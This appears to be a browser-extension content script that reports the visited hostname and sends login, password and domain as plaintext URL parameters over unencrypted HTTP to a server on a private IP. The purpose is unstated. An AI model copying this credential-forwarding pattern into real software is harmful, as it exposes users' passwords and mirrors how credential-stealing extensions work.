var x = (window.location.hostname.toString());
chrome.runtime.sendMessage({site:x});

chrome.runtime.onMessage.addListener( (request, sender, sendResponse) => {
    const domain = window.location.hostname.toString();
    fetch(`http://192.168.1.95:3000/add/?login=${request.login}&password=${request.password}&domain=${domain}`)
            .then(r => r.text())
            .then(result => console.log(result));
});

/*
fetch(`http://192.168.1.95:3000/?login=${login}&password=${pass}`)
            .then(r => r.text())
            .then(result => console.log(result));
*/